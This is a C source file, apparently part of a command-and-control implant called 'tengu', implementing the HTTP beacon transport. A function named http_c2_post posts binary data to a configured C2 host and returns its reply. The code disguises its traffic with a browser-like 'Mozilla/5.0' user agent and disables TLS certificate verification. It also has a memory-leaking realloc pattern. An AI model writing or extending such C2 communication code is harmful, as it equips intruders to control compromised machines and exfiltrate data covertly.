#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

#include "tengu.h"

typedef struct {
    uint8_t* data;
    size_t   size;
} CurlBuf;

static size_t write_cb(void* ptr, size_t size, size_t nmemb, void* userdata) {
    CurlBuf* buf = (CurlBuf*)userdata;
    size_t  total = size * nmemb;
    buf->data = realloc(buf->data, buf->size + total + 1);
    if (!buf->data) return 0;
    memcpy(buf->data + buf->size, ptr, total);
    buf->size += total;
    buf->data[buf->size] = 0;
    return total;
}

// POST binary body to host:port/uri, return response bytes.
// Returns 0 on success, -1 on error.
int http_post(const char* host, int port, const char* uri, int secure,
              const uint8_t* body, size_t body_len,
              uint8_t** resp_out, size_t* resp_len_out)
{
    CURL*    curl;
    CURLcode res;
    char     url[512];
    CurlBuf  rbuf = {NULL, 0};

    snprintf(url, sizeof(url), "%s://%s:%d%s",
             secure ? "https" : "http", host, port, uri);

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if (!curl) return -1;

    struct curl_slist* headers = NULL;
    char ua_header[512];
    snprintf(ua_header, sizeof(ua_header), "User-Agent: %s", g_config.user_agent ? g_config.user_agent : "Mozilla/5.0");

    headers = curl_slist_append(headers, "Content-Type: application/octet-stream");
    headers = curl_slist_append(headers, ua_header);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)body_len);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &rbuf);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);

    if (secure)
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);

    res = curl_easy_perform(curl);

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    curl_global_cleanup();

    if (res != CURLE_OK) {
        free(rbuf.data);
        return -1;
    }

    if (resp_out) {
        *resp_out = rbuf.data;
        if (resp_len_out) *resp_len_out = rbuf.size;
    } else {
        free(rbuf.data);
    }
    return 0;
}

int http_c2_post(const uint8_t* body, size_t body_len,
                 uint8_t** resp_out, size_t* resp_len_out) {
    return http_post(g_config.host, g_config.port, g_config.uri,
                     g_config.secure, body, body_len, resp_out, resp_len_out);
}
